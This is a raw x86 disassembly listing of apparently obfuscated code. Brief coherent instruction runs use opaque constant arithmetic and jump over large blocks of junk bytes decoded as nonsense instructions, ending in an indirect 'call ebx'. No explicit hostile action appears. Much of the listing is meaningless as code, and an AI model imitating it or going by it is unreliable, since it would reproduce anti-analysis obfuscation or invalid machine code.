  410aca:	mov    DWORD PTR [ebp-0x10],eax
  410acd:	mov    eax,DWORD PTR [ebp-0x1c]
  410ad0:	test   eax,eax
  410ad2:	je     0x41108e
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	(bad)  
  410af2:	das    
  410af3:	inc    edi
  410af4:	pop    ebp
  410af5:	adc    DWORD PTR [ebp+0x7c],eax
  410af8:	jl     0x410b0c
  410afa:	jg     0x410b78
  410afc:	jl     0x410aea
  410afe:	cld    
  410aff:	ss push ecx
  410b01:	data16 jno 0x410aab
  410b04:	xor    al,0xad
  410b06:	xchg   ecx,eax
  410b07:	imul   edi,DWORD PTR [esi-0x29],0xf5ea2583
  410b0e:	aas    
  410b0f:	push   ebp
  410b10:	dec    ebp
  410b11:	aaa    
  410b12:	pop    ss
  410b13:	dec    esp
  410b14:	pop    edx
  410b15:	imul   ebp,DWORD PTR [ebx-0x68536d53],0xffffff90
  410b1c:	lods   al,BYTE PTR ds:[esi]
  410b1d:	mov    esp,0x9d45aa99
  410b22:	aam    0x84
  410b24:	pushf  
  410b25:	mov    ds:0xbcd7b6a0,eax
  410b2a:	adc    ebx,DWORD PTR [ecx-0x20]
  410b2d:	pop    ss
  410b2e:	adc    BYTE PTR [ecx-0x32],dl
  410b31:	mov    WORD PTR [edi-0x62],ss
  410b34:	nop
  410b35:	daa    
  410b36:	test   eax,0xf3aa103a
  410b3b:	push   edi
  410b3c:	imul   esi,ebx,0x3f8fcac2
  410b42:	sub    eax,0x43f0d76c
  410b47:	xor    esp,DWORD PTR [edx]
  410b49:	std    
  410b4a:	es xchg ecx,eax
  410b4c:	sub    dl,BYTE PTR [ebx-0x96cc32f]
  410b52:	loop   0x410ba3
  410b54:	mov    esp,DWORD PTR [ecx-0x3e15b68]
  410b5a:	sar    DWORD PTR [eax+0x5f],0x34
  410b5e:	push   0xffffffeb
  410b60:	add    edx,ebp
  410b62:	(bad)  
  410b63:	repnz sbb eax,0x71153eb8
  410b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b6a:	mov    ch,0xf8
  410b6c:	scas   al,BYTE PTR es:[edi]
  410b6d:	adc    DWORD PTR [eax],esp
  410b6f:	fiadd  WORD PTR [ebx+0x7b385294]
  410b75:	fldcw  WORD PTR [ecx-0x6e1496ca]
  410b7b:	call   0xe771:0x956499ba
  410b82:	stos   DWORD PTR es:[edi],eax
  410b83:	int    0xb4
  410b85:	(bad)  
  410b87:	pop    esi
  410b88:	xor    cl,BYTE PTR [ebx+0x66075551]
  410b8e:	add    ch,BYTE PTR [edx]
  410b90:	jno    0x410b33
  410b92:	sub    al,0x48
  410b94:	push   eax
  410b95:	inc    esi
  410b96:	imul   ecx,DWORD PTR [ecx+0x51dafe1b],0x5f
  410b9d:	dec    ecx
  410b9e:	es stc 
  410ba0:	test   BYTE PTR [eax-0xb],dl
  410ba3:	jne    0x410b2e
  410ba5:	clc    
  410ba6:	loopne 0x410b5d
  410ba8:	enter  0xd2d6,0x91
  410bac:	cmp    ecx,edx
  410bae:	fldenv [edi-0x4e]
  410bb1:	xchg   DWORD PTR cs:[edi],ebx
  410bb4:	pop    ebp
  410bb5:	add    cl,al
  410bb7:	and    ch,BYTE PTR [ebp-0x3bce8e6a]
  410bbd:	bound  edi,QWORD PTR [ebp-0x6692e443]
  410bc3:	or     DWORD PTR [ebp+0x69],0xffffff91
  410bc7:	jg     0x410b76
  410bc9:	jge    0x410c1f
  410bcb:	(bad)  
  410bcc:	(bad)  
  410bcd:	jmp    0xf18f:0xf7a69279
  410bd4:	mov    dh,0x8
  410bd6:	jo     0x410c50
  410bd8:	or     DWORD PTR [ebx],edx
  410bda:	pop    esi
  410bdb:	push   cs
  410bdc:	or     eax,0xdcb37452
  410be1:	mov    ecx,0x636509e
  410be6:	lds    ecx,FWORD PTR [ebp-0x29]
  410be9:	jo     0x410b8b
  410beb:	push   ds
  410bec:	xchg   esi,eax
  410bed:	(bad)  
  410bee:	cmc    
  410bef:	mov    dh,0x70
  410bf1:	mov    ah,0x17
  410bf3:	cmp    al,0xf5
  410bf5:	pop    ds
  410bf6:	xchg   esi,eax
  410bf7:	jp     0x410bb7
  410bf9:	mov    eax,0xa11ccf8e
  410bfe:	jae    0x410ba8
  410c00:	jecxz  0x410b88
  410c02:	not    edi
  410c04:	fs sahf 
  410c06:	imul   esp,eax,0x58
  410c09:	imul   BYTE PTR [ecx+edx*8+0x6faa2373]
  410c10:	ror    ebx,0x86
  410c13:	mov    edx,0x75250f99
  410c18:	test   al,0x4b
  410c1a:	or     BYTE PTR [ecx+0x5b],0x87
  410c1e:	retf   
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	and    esi,DWORD PTR [edx]
  410c87:	and    eax,0x7c4437b6
  410c8c:	jl     0x410ca0
  410c8e:	jg     0x410d0c
  410c90:	jl     0x410c37
  410c92:	dec    ebp
  410c93:	and    esi,DWORD PTR [eax-0x6d3c5c8b]
  410c99:	jp     0x410c3f
  410c9b:	dec    ebp
  410c9c:	pusha  
  410c9d:	dec    ebx
  410c9e:	inc    ebp
  410c9f:	dec    ebx
  410ca0:	mov    esi,0xef4703
  410ca5:	ss sub eax,eax
  410ca8:	push   ds
  410ca9:	jmp    0x410cec
  410cab:	aam    0xd
  410cad:	pop    ds
  410cae:	sbb    eax,0xb21430aa
  410cb3:	lods   al,BYTE PTR ds:[esi]
  410cb4:	xchg   ebp,eax
  410cb5:	out    dx,al
  410cb6:	inc    BYTE PTR [ebp-0x58f966f3]
  410cbc:	les    esp,FWORD PTR ds:0xc4f5e7eb
  410cc2:	fsubr  DWORD PTR [edx]
  410cc4:	shr    DWORD PTR [eax-0x2b],cl
  410cc7:	cdq    
  410cc8:	pop    edi
  410cc9:	dec    esp
  410cca:	pop    ss
  410ccb:	push   0xbd2691b2
  410cd0:	je     0x410d42
  410cd2:	and    al,0x97
  410cd4:	dec    edx
  410cd5:	mov    ds:0x766fe509,eax
  410cda:	jbe    0x410cf7
  410cdc:	cmp    eax,0x54d97e0a
  410ce1:	jmp    0xb645:0x42d944eb
  410ce8:	rcr    BYTE PTR [ecx+0x3f5e811c],0xbd
  410cef:	push   ds
  410cf0:	jmp    0x1e670f56
  410cf5:	imul   ebx,ecx
  410cf8:	mov    eax,0x1f4266a6
  410cfd:	mov    eax,ds:0xb674ce40
  410d02:	fimul  DWORD PTR [ecx-0x3f]
  410d05:	(bad)  
  410d07:	jecxz  0x410d22
  410d09:	mov    al,ds:0xed6926b7
  410d0e:	and    al,0x29
  410d10:	scas   eax,DWORD PTR es:[edi]
  410d11:	lock mov DWORD PTR [ecx+0xb],esi
  410d15:	sbb    dl,dl
  410d17:	fld    TBYTE PTR [ebx+0x73]
  410d1a:	mov    BYTE PTR [edx],bh
  410d1c:	sub    eax,0xc515f550
  410d21:	fidivr DWORD PTR [esi-0x2bf35575]
  410d27:	pop    esi
  410d28:	push   ebx
  410d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d2a:	stc    
  410d2b:	in     al,dx
  410d2c:	sti    
  410d2d:	mov    ds,WORD PTR [bx]
  410d30:	outs   dx,DWORD PTR ds:[esi]
  410d31:	stc    
  410d32:	mov    edx,DWORD PTR [edi]
  410d34:	fyl2x  
  410d36:	ror    ah,cl
  410d38:	push   eax
  410d39:	mov    ds:0x96dcedc,eax
  410d3e:	clc    
  410d3f:	stos   DWORD PTR es:[edi],eax
  410d40:	and    dh,BYTE PTR [esi+0x3f425e54]
  410d46:	add    BYTE PTR [ebx-0xbedd28e],al
  410d4c:	cmp    DWORD PTR [ebx+0xe],edx
  410d4f:	cmp    DWORD PTR [edi],0x519c08ab
  410d55:	mov    esi,DWORD PTR [eax+eiz*4]
  410d58:	pop    ds
  410d59:	cwde   
  410d5a:	mov    al,ds:0xeae6ba72
  410d5f:	aad    0xae
  410d61:	mov    ebx,esi
  410d63:	push   ecx
  410d64:	mov    cl,0x82
  410d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d67:	fucompp 
  410d69:	int    0x97
  410d6b:	mov    al,0x13
  410d6d:	dec    edi
  410d6e:	xchg   esi,eax
  410d6f:	adc    BYTE PTR [eax+ebx*4-0x70],0x84
  410d74:	das    
  410d75:	pop    edi
  410d76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d77:	mov    al,ds:0xc7785b99
  410d7c:	rcr    bl,1
  410d7e:	jb     0x410d62
  410d80:	xor    al,0x92
  410d82:	aaa    
  410d83:	sub    eax,0x3e764885
  410d88:	jle    0x410d41
  410d8a:	jmp    0x7732:0x7ebff306
  410d91:	(bad)  [ebx+0x7803951f]
  410d97:	xlat   BYTE PTR ds:[ebx]
  410d98:	inc    ebx
  410d99:	pop    ds
  410d9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d9b:	jle    0x410d9b
  410d9d:	mov    al,ds:0x2e34007c
  410da2:	cmp    DWORD PTR [eax],ebx
  410da4:	xor    bl,ah
  410da6:	mov    ecx,ebx
  410da8:	dec    ecx
  410da9:	or     eax,0x6224134b
  410dae:	push   ds
  410daf:	mov    ecx,0x7510853
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx+0x37397600],esi
  410e04:	sbb    al,0xd5
  410e06:	inc    edi
  410e07:	jl     0x410e85
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410dbf
  410e0e:	push   esp
  410e0f:	xchg   DWORD PTR [ebp-0x689a21b9],ecx
  410e15:	dec    esp
  410e16:	les    ebx,FWORD PTR [ebp-0x2522dcb7]
  410e1c:	aas    
  410e1d:	imul   ebp,DWORD PTR [edi-0x319d884c],0xfc004791
  410e27:	inc    edx
  410e28:	loope  0x410de1
  410e2a:	mov    dl,0x82
  410e2c:	mov    ?,WORD PTR [ebx+ebp*1+0x27]
  410e30:	or     eax,DWORD PTR [eax-0x7a69f039]
  410e36:	dec    eax
  410e37:	clc    
  410e38:	dec    ebx
  410e39:	aas    
  410e3a:	fld    QWORD PTR [esi+0x23]
  410e3d:	push   0x1cf1dd4a
  410e42:	dec    esp
  410e43:	cmp    DWORD PTR [ebx-0x4350fe75],ebx
  410e49:	xor    DWORD PTR ds:0x5ad7d5eb,esi
  410e4f:	aam    0xd7
  410e51:	popf   
  410e52:	jge    0x410de1
  410e54:	cmp    BYTE PTR [eax+esi*4],ch
  410e57:	adc    ah,ch
  410e59:	es dec edi
  410e5b:	loop   0x410ea5
  410e5d:	adc    DWORD PTR [edi+ebp*2+0x65959799],edi
  410e64:	aas    
  410e65:	test   al,0x3d
  410e67:	lds    ebx,FWORD PTR [edi+0x5e]
  410e6a:	sub    ebp,edi
  410e6c:	inc    edi
  410e6d:	mov    eax,ds:0x14a7f45c
  410e72:	dec    cx
  410e74:	inc    ecx
  410e75:	and    eax,edi
  410e77:	xchg   BYTE PTR [edx+eax*4],al
  410e7a:	xchg   ebp,eax
  410e7b:	mov    dl,BYTE PTR [ebp+0x16281367]
  410e81:	inc    eax
  410e82:	cmp    DWORD PTR [ebp-0x74],esp
  410e85:	repz jo 0x410e33
  410e88:	test   BYTE PTR [edx],0xb
  410e8b:	fist   WORD PTR [edi-0x68]
  410e8e:	ret    
  410e8f:	jp     0x410e32
  410e91:	mul    DWORD PTR [ecx+0x58]
  410e94:	xlat   BYTE PTR ds:[ebx]
  410e95:	fdivr  st(6),st
  410e97:	jg     0x410e71
  410e99:	push   edi
  410e9a:	add    al,0x6b
  410e9c:	es repz js 0x410e78
  410ea0:	lahf   
  410ea1:	mov    dl,BYTE PTR [eax-0x62]
  410ea4:	mov    dl,0x8e
  410ea6:	lods   eax,DWORD PTR ds:[esi]
  410ea7:	fs sti 
  410ea9:	scas   eax,DWORD PTR es:[edi]
  410eaa:	xchg   edi,eax
  410eab:	je     0x410f13
  410ead:	adc    al,0xe2
  410eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eb0:	adc    esp,esp
  410eb2:	rcr    DWORD PTR [ebp+0x40],0x13
  410eb6:	adc    al,0xe0
  410eb8:	clc    
  410eb9:	xor    eax,0xd26f1493
  410ebe:	jl     0x410ecb
  410ec0:	push   edx
  410ec1:	jns    0x410edb
  410ec3:	xor    al,bh
  410ec5:	mov    ebx,0x59a5f29b
  410eca:	push   ss
  410ecb:	sub    eax,0x1328894f
  410ed0:	in     al,dx
  410ed1:	mov    esi,DWORD PTR [eax]
  410ed3:	push   0x445837ca
  410ed8:	mov    ebx,0xa332f75c
  410edd:	mov    edx,0x646896b9
  410ee2:	cmc    
  410ee3:	add    edx,DWORD PTR [edi+0x1c]
  410ee6:	dec    esi
  410ee7:	jns    0x410e9f
  410ee9:	scas   al,BYTE PTR es:[edi]
  410eea:	cmp    eax,0x321d4ded
  410eef:	or     esi,DWORD PTR [eax]
  410ef1:	jmp    0x410e88
  410ef3:	mov    eax,0x31a4cc72
  410ef8:	inc    edx
  410ef9:	sbb    eax,DWORD PTR [ebx-0x55]
  410efc:	hlt    
  410efd:	enter  0x45ae,0xe0
  410f01:	stc    
  410f02:	leave  
  410f03:	push   eax
  410f04:	jp     0x410f0f
  410f06:	sub    esi,DWORD PTR [edx+0x1e3be279]
  410f0c:	pop    esi
  410f0d:	aas    
  410f0e:	pop    es
  410f0f:	mov    bl,cl
  410f11:	xor    bl,al
  410f13:	mov    edi,edx
  410f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f16:	pop    esp
  410f17:	call   0xe8be:0x3d9c5319
  410f1e:	mov    ch,BYTE PTR [edx+esi*1]
  410f21:	adc    dl,BYTE PTR [ebx+0x1]
  410f24:	and    BYTE PTR [edx-0x47],dh
  410f27:	test   esi,esp
  410f29:	pop    ebx
  410f2a:	fld    DWORD PTR [ebx]
  410f2c:	(bad)  
  410f2d:	imul   eax,DWORD PTR [edx]
  410f30:	mov    edx,DWORD PTR [ebp-0x4]
  410f33:	xor    edx,ecx
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	mov    ebp,ebx
  410f4b:	xchg   edi,eax
  410f4c:	pop    ebp
  410f4d:	jmp    0x410f95
  410f4f:	jl     0x410fcd
  410f51:	adc    bh,BYTE PTR [edi+0x7c]
  410f54:	jl     0x410f2a
  410f56:	push   edx
  410f57:	retf   
  410f58:	in     eax,dx
  410f59:	(bad)
  410f5c:	cmp    cl,BYTE PTR [edi]
  410f5e:	in     al,dx
  410f5f:	adc    eax,0x8a4fcab
  410f64:	xchg   edi,ecx
  410f66:	adc    eax,0x35e18cba
  410f6b:	fwait
  410f6c:	sar    BYTE PTR [ebx+0x29b51620],0xfc
  410f73:	(bad)  
  410f74:	xlat   BYTE PTR ds:[ebx]
  410f75:	mov    bh,0xe6
  410f77:	pop    edx
  410f78:	mov    eax,ds:0x4cab0ad2
  410f7d:	xor    ebx,ecx
  410f7f:	shl    al,1
  410f81:	repnz outs dx,DWORD PTR ds:[esi]
  410f84:	daa    
  410f85:	sbb    al,0xf3
  410f87:	jmp    0x8da5:0x8830b988
  410f8e:	xchg   edx,eax
  410f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f90:	xchg   ebp,eax
  410f91:	mov    ebx,DWORD PTR [esi-0x6b98a702]
  410f97:	mov    esi,0xafecd7a6
  410f9c:	rcl    DWORD PTR [ebp+0x71b75c48],1
  410fa2:	sbb    DWORD PTR [edx+0x57763c1c],0xffffffe1
  410fa9:	sahf   
  410faa:	dec    esi
  410fab:	or     eax,0xcd7458fe
  410fb0:	or     al,dl
  410fb2:	adc    BYTE PTR [edi-0x1c],cl
  410fb5:	pop    edx
  410fb6:	nop
  410fb7:	add    ebp,DWORD PTR [ebx-0x7b]
  410fba:	imul   esp,DWORD PTR [eax],0xafa1f921
  410fc0:	sub    al,0xcb
  410fc2:	in     al,0x7c
  410fc4:	pop    esi
  410fc5:	inc    edx
  410fc6:	loope  0x411036
  410fc8:	dec    eax
  410fc9:	pop    esi
  410fca:	xchg   esi,eax
  410fcb:	add    eax,0x93c83720
  410fd0:	aaa    
  410fd1:	and    esp,DWORD PTR [ebx-0x170894a6]
  410fd7:	std    
  410fd8:	inc    esi
  410fd9:	inc    esp
  410fda:	adc    BYTE PTR [ecx+0x48],dh
  410fdd:	mov    bl,0xa1
  410fdf:	into   
  410fe0:	dec    eax
  410fe1:	xchg   edi,eax
  410fe2:	or     dl,bl
  410fe4:	xchg   ebp,eax
  410fe5:	dec    ebx
  410fe6:	xchg   ebx,eax
  410fe7:	sub    ecx,DWORD PTR [eax+esi*8]
  410fea:	mov    dl,0xba
  410fec:	add    ecx,DWORD PTR [eax+0x2d]
  410fef:	jge    0x410f94
  410ff1:	ret    0xc866
  410ff4:	and    edx,DWORD PTR [edi+0x58bb3914]
  410ffa:	cmp    bl,BYTE PTR [ecx]
  410ffc:	loop   0x410ff7
  410ffe:	mov    ah,0x57
  411000:	jns    0x411058
  411002:	clc    
  411003:	dec    edx
  411004:	outs   dx,DWORD PTR ds:[esi]
  411005:	sub    DWORD PTR [esp+edx*8-0xe],edi
  411009:	jg     0x410ff1
  41100b:	pop    edi
  41100c:	jbe    0x410fff
  41100e:	mov    ch,0x7e
  411010:	nop
  411011:	pop    esi
  411012:	xchg   edi,eax
  411013:	call   0x104f53c3
  411018:	data16 jge 0x410fc1
  41101b:	jge    0x411019
  41101d:	dec    edx
  41101e:	dec    eax
  41101f:	mov    eax,0x1df19e4
  411024:	pop    es
  411025:	mov    WORD PTR [edx-0x46e65277],fs
  41102b:	add    DWORD PTR [esi],ebp
  41102d:	mov    esi,0xb2577308
  411032:	lods   al,BYTE PTR ds:[esi]
  411033:	mov    ah,0xa9
  411035:	mov    eax,ds:0x90a2c1bf
  41103a:	mov    ds:0x911e7245,al
  41103f:	add    eax,0x5b5890b7
  411044:	loope  0x4110c4
  411046:	sbb    esp,ecx
  411048:	mov    ah,0x1
  41104a:	adc    ebx,esi
  41104c:	and    eax,0x411cb566
  411051:	mov    dl,0xb0
  411053:	ror    BYTE PTR [esi-0x10],cl
  411056:	push   ebx
  411057:	inc    ebx
  411058:	xor    eax,DWORD PTR cs:[edi+edi*2-0x155d6616]
  411060:	sbb    ebp,ebp
  411062:	popf   
  411063:	sub    DWORD PTR [edx+0x39],0x3
  411067:	out    0x56,al
  411069:	sahf   
  41106a:	xchg   ebp,eax
  41106b:	pop    ebp
  41106c:	daa    
  41106d:	test   al,0xc4
  41106f:	dec    edx
  411070:	mov    al,ds:0x8c8dd7e4
  411075:	or     bl,BYTE PTR [edx+0x3b003272]
  41107b:	enter  0x850f,0xe5
  41107f:	sti    
  411080:	(bad)  
  411081:	dec    DWORD PTR [ebx+0x5e9de]
  411087:	add    BYTE PTR [eax],al
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	in     al,0xb9
  4110b3:	cmp    al,0x5f
  4110b5:	mov    DWORD PTR [ecx+0x7c],eax
  4110b8:	jl     0x4110cc
  4110ba:	jg     0x411138
  4110bc:	jl     0x41113b
  4110be:	jnp    0x41105b
  4110c0:	jecxz  0x4110dd
  4110c2:	and    edi,edx
  4110c4:	arpl   WORD PTR [eiz*2+0x62a7d303],bx
  4110cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110cc:	imul   eax,DWORD PTR [eax],0xffffffb4
  4110cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110d0:	dec    eax
  4110d1:	(bad)  
  4110d2:	pusha  
  4110d3:	loop   0x411144
  4110d5:	cli    
  4110d6:	sbb    esp,DWORD PTR ds:0x4ed01b54
  4110dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110dd:	mov    eax,ds:0x4564b751
  4110e2:	jae    0x411076
  4110e4:	fnstenv [ebx+0x60]
  4110e7:	add    BYTE PTR [edi-0xa],al
  4110ea:	cmc    
  4110eb:	xor    DWORD PTR [eax+0x5e],0x1fd6c017
  4110f2:	and    esp,eax
  4110f4:	lods   eax,DWORD PTR ds:[esi]
  4110f5:	pop    ds
  4110f6:	mov    edx,0x658a69b1
  4110fb:	pop    es
  4110fc:	or     BYTE PTR [edi-0x3f],bh
  4110ff:	pop    edi
  411100:	arpl   WORD PTR [esi],di
  411102:	adc    eax,0x5ec02119
  411107:	cmp    esi,ecx
  411109:	std    
  41110a:	pop    esi
  41110b:	cmp    DWORD PTR [esi],0x543ad0d7
  411111:	pop    es
  411112:	fwait
  411113:	popa   
  411114:	add    dl,al
  411116:	mov    ebx,0xe877f24d
  41111b:	jl     0x411112
  41111d:	jae    0x4110c6
  41111f:	xchg   edi,eax
  411120:	in     al,dx
  411121:	js     0x4110b1
  411123:	push   0xe57d5dee
  411128:	add    BYTE PTR [edx-0x2c],0x24
  41112c:	gs je  0x41111b
  41112f:	push   eax
  411130:	mov    ebx,0x7080ea29
  411135:	and    al,0xf2
  411138:	sbb    BYTE PTR [edi-0x7f],0xb
  41113c:	add    al,0x95
  41113e:	sub    al,0xc9
  411140:	data16 (bad) 
  411142:	out    0xce,eax
  411144:	adc    BYTE PTR [eax],al
  411146:	pop    ebx
  411147:	xchg   esp,eax
  411148:	(bad)  
  411149:	adc    dl,BYTE PTR [ebp+0x16]
  41114c:	ret    0x33c1
  41114f:	xor    ecx,edi
  411151:	or     BYTE PTR [ecx+esi*2+0x20cdc7be],ch
  411158:	sar    DWORD PTR [edx+0x3aa6535d],1
  41115e:	sbb    eax,DWORD PTR [edx]
  411160:	mov    ds:0x8106a36c,al
  411165:	jnp    0x411195
  411167:	push   es
  411168:	pop    es
  411169:	scas   al,BYTE PTR es:[edi]
  41116a:	xchg   ebp,eax
  41116b:	std    
  41116c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116d:	dec    ebp
  41116e:	mov    dh,0x7a
  411170:	push   esi
  411171:	mov    ah,0xa6
  411173:	pushf  
  411174:	or     al,BYTE PTR [edi+0x55cf4b66]
  41117a:	bound  eax,QWORD PTR [edi+0x4a3454c8]
  411180:	scas   al,BYTE PTR es:[edi]
  411181:	dec    ebx
  411182:	add    al,0x15
  411184:	rcr    DWORD PTR [ebp+0x18eb7c72],1
  41118a:	xor    eax,0x4577e192
  41118f:	mov    dh,0xac
  411191:	aad    0xc7
  411193:	sub    eax,0x91d711f4
  411198:	daa    
  411199:	gs mov cl,0xf3
  41119c:	imul   edx,DWORD PTR [ebp-0x75],0x2138e02f
  4111a3:	jp     0x41116f
  4111a5:	and    dh,BYTE PTR [ecx]
  4111a7:	adc    edi,DWORD PTR [eax+0x105068b8]
  4111ad:	jb     0x41118a
  4111af:	mov    edx,0xd12abadd
  4111b4:	cmp    ch,bl
  4111b6:	loopne 0x4111d6
  4111b8:	mov    al,0xe1
  4111ba:	ins    DWORD PTR es:[edi],dx
  4111bb:	pop    edi
  4111bc:	les    eax,FWORD PTR [ebx+0x31af027]
  4111c2:	iret   
  4111c3:	pop    ss
  4111c4:	aad    0xd4
  4111c6:	fcmovb st,st(6)
  4111c8:	dec    eax
  4111c9:	pop    ss
  4111ca:	and    dh,BYTE PTR [ecx]
  4111cc:	cmp    eax,0x486afb47
  4111d1:	add    BYTE PTR [esi-0x1b],dh
  4111d4:	loope  0x4111fc
  4111d6:	std    
  4111d7:	leave  
  4111d8:	adc    edi,DWORD PTR [ecx-0x40]
  4111db:	add    ebx,DWORD PTR [eax]
  4111dd:	call   ebx
  4111df:	xor    ebx,ebx
  4111e1:	inc    ebx
  4111e2:	cmp    DWORD PTR [ebp+0x10],ebx
  4111e5:	je     0x41133e
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0x2b5a,0x4c
  4111ff:	push   0x46
  411201:	scas   eax,DWORD PTR es:[edi]
  411202:	inc    eax
  411203:	jl     0x411281
  411205:	adc    bh,BYTE PTR [edi+0x7c]
  411208:	jl     0x41125e
  41120a:	popf   
  41120b:	or     eax,0xd2c3f2b0
  411210:	lods   eax,DWORD PTR ds:[esi]
  411211:	or     DWORD PTR [eax-0x65ee679e],edi
  411217:	xchg   edi,eax
  411218:	stc    
  411219:	jle    0x4111f6
  41121b:	add    dh,BYTE PTR [ebx+ebx*4]
  41121e:	add    eax,0x6b3e8d2a
  411223:	pop    esi
  411224:	jge    0x41126b
  411226:	inc    ebp
  411227:	push   ebp
  411228:	jbe    0x411206
  41122a:	mov    WORD PTR [esi+ecx*8],cs
  41122d:	(bad)  [edi-0x2a]
  411230:	pop    ss
  411231:	int    0x2b
  411233:	dec    edi
  411234:	(bad)  
  411235:	leave  
  411236:	add    al,0xd7
  411238:	xchg   ebx,eax
  411239:	push   edi
  41123a:	ds call 0x3f85:0x5ed6635
  411242:	xor    DWORD PTR [ebx],esp
  411244:	xor    ebx,DWORD PTR [ecx-0x1dd28bda]
  41124a:	ret    0xaa13
  41124d:	popf   
  41124e:	add    DWORD PTR [ecx+0x33],eax
  411251:	je     0x4111d9
  411253:	les    esi,FWORD PTR [ebx+0x2f]
  411256:	lods   eax,DWORD PTR ds:[esi]
  411257:	or     ebx,ebx
  411259:	out    0x22,al
  41125b:	mov    edx,0x66fde4cc
  411260:	inc    eax
  411261:	fisttp DWORD PTR [edx+0x18]
  411264:	imul   edi,ebx,0xffffffca
  411267:	ret    
  411268:	pop    ss
  411269:	push   ebx
  41126a:	jae    0x4111ec
  41126c:	repz out dx,eax
  41126e:	clc    
  41126f:	jne    0x4112e4
  411271:	and    eax,DWORD PTR [ecx+edx*8-0x56ec9599]
  411278:	xchg   esi,eax
  411279:	pusha  
  41127a:	xchg   BYTE PTR [ebp-0x34],al
  41127d:	sub    al,0x3a
  41127f:	ret    0x13b7
  411282:	push   0x892f6554
  411287:	xchg   ecx,eax
  411288:	mov    ch,0xf6
  41128a:	fsubr  st(2),st
  41128c:	mov    edi,0xc4cfaed9
  411291:	jl     0x4112cb
  411293:	aaa    
  411294:	sti    
  411295:	outs   dx,DWORD PTR ds:[esi]
  411296:	retf   0x5f1
  411299:	test   edi,esp
  41129b:	fnsave [esi-0x5c29eab]
  4112a1:	and    eax,0x8bc57b62
  4112a6:	xor    bh,BYTE PTR [edi]
  4112a8:	in     al,dx
  4112a9:	imul   esi,ecx,0x1da4d52a
  4112af:	pop    ss
